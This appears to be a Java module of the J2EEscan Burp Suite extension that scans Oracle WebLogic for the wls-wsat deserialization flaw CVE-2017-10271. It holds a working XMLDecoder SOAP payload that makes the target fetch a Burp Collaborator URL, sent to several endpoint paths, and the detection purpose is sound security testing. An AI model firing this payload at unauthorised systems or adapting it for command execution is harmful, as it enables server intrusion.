package burp.j2ee.issues.impl;

import burp.IBurpCollaboratorClientContext;
import burp.IBurpCollaboratorInteraction;
import burp.IBurpExtenderCallbacks;
import burp.IExtensionHelpers;
import burp.IHttpRequestResponse;
import burp.IRequestInfo;
import burp.IScanIssue;
import burp.IScannerInsertionPoint;
import burp.j2ee.Confidence;
import burp.j2ee.CustomScanIssue;
import burp.j2ee.Risk;
import burp.j2ee.annotation.RunOnlyOnce;
import burp.j2ee.issues.IModule;
import java.io.PrintWriter;
import java.net.URL;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.LinkedHashSet;
import java.util.List;

/**
 *
 * Weblogic wls-wsat Component Deserialization Vulnerability CVE-2017-10271
 *
 * References:
 *
 *  - https://www.oracle.com/security-alerts/alert-cve-CVE-2017-10271.html
 *  - https://nvd.nist.gov/vuln/detail/CVE-2019-2725
 *  - https://blog.rapid7.com/2019/05/03/weblogic-deserialization-remote-code-execution-vulnerability-cve-2019-2725-what-you-need-to-know/
 *
 */
public class WeblogicCVE201710271 implements IModule {

    private static final String TITLE = "Weblogic - 'wls-wsat' Component Deserialisation Remote Command Execution";
    private static final String DESCRIPTION = "J2EEscan identified a remote command execution the <b>wls-wsat</b> component<br />"
            + "The Oracle WebLogic WLS WSAT Component is vulnerable to a XML Deserialization remote code execution vulnerability<br /><br />"
            + "<b>References:</b>"
            + "<ul>"
            + "<li>https://www.oracle.com/technetwork/topics/security/cpuoct2017-3236626.html</li>"
            + "<li>https://www.rapid7.com/db/modules/exploit/multi/http/oracle_weblogic_wsat_deserialization_rce</li>"
            + "<li>https://www.exploit-db.com/exploits/43924</li>"
            + "<li>https://www.exploit-db.com/exploits/43458</li>"
            + "</ul>";

    private static final String REMEDY = "Update the Weblogic componenent with the last security patches provided by Oracle";

    // List of host and port system already tested
    private static LinkedHashSet hs = new LinkedHashSet();
    private PrintWriter stderr;

    private static final List<String> WLS_WSAT_PATHS = Arrays.asList(
            "/wls-wsat/CoordinatorPortType",
            "/wls-wsat/CoordinatorPortType11",
            "/wls-wsat/ParticipantPortType",
            "/wls-wsat/ParticipantPortType11",
            "/wls-wsat/RegistrationPortTypeRPC",
            "/wls-wsat/RegistrationPortTypeRPC11",
            "/wls-wsat/RegistrationRequesterPortType",
            "/wls-wsat/RegistrationRequesterPortType11"
    );

    @RunOnlyOnce
    public List<IScanIssue> scan(IBurpExtenderCallbacks callbacks, IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {

        List<IScanIssue> issues = new ArrayList<>();

        IExtensionHelpers helpers = callbacks.getHelpers();
        stderr = new PrintWriter(callbacks.getStderr(), true);
        IRequestInfo reqInfo = helpers.analyzeRequest(baseRequestResponse);

        URL url = reqInfo.getUrl();
        String host = url.getHost();
        int port = url.getPort();

        String system = host.concat(Integer.toString(port));

        // System not yet tested for this vulnerability
        if (!hs.contains(system)) {

            hs.add(system);

            String protocol = url.getProtocol();

            String serializedRce = "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\">"
                    + "<soapenv:Header>"
                    + "<work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\">"
                    + "  <java version=\"1.8\" class=\"java.beans.XMLDecoder\">"
                    + "    <void id=\"url\" class=\"java.net.URL\">"
                    + "      <string>http://%s</string>"
                    + "    </void>"
                    + "    <void idref=\"url\">"
                    + "      <void id=\"stream\" method = \"openStream\" />"
                    + "    </void>"
                    + "  </java>"
                    + "</work:WorkContext>"
                    + "</soapenv:Header>"
                    + "<soapenv:Body/>"
                    + "</soapenv:Envelope>";

            // Collaborator context
            IBurpCollaboratorClientContext collaboratorContext = callbacks.createBurpCollaboratorClientContext();
            String currentCollaboratorPayload = collaboratorContext.generatePayload(true);

            for (String WLS_WSAT_PATH : WLS_WSAT_PATHS) {

                List<String> headers = new ArrayList<>();
                headers.add(String.format("POST %s HTTP/1.1", WLS_WSAT_PATH));
                headers.add("Host: " + url.getHost() + ":" + url.getPort());
                headers.add("Content-Type: text/xml");
                headers.add("Cookie: ADMINCONSOLESESSION=pTsBVcsdVx2g20mxPJyyPDvqTwQmQDtw7R541DGJGGXD2qh4rDBJ!1211788216");

                String finalPayload = String.format(serializedRce, currentCollaboratorPayload);

                byte[] serializedMessage = helpers.buildHttpMessage(headers, finalPayload.getBytes());
                IHttpRequestResponse resp = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), serializedMessage);

                // Poll Burp Collaborator for remote interaction
                List<IBurpCollaboratorInteraction> collaboratorInteractions = collaboratorContext.fetchCollaboratorInteractionsFor(currentCollaboratorPayload);

                if (!collaboratorInteractions.isEmpty()) {
                    issues.add(new CustomScanIssue(
                            baseRequestResponse.getHttpService(),
                            helpers.analyzeRequest(baseRequestResponse).getUrl(),
                            resp,
                            TITLE,
                            DESCRIPTION,
                            REMEDY,
                            Risk.High,
                            Confidence.Certain));

                    return issues;

                }

            }
        }

        return issues;
    }

}
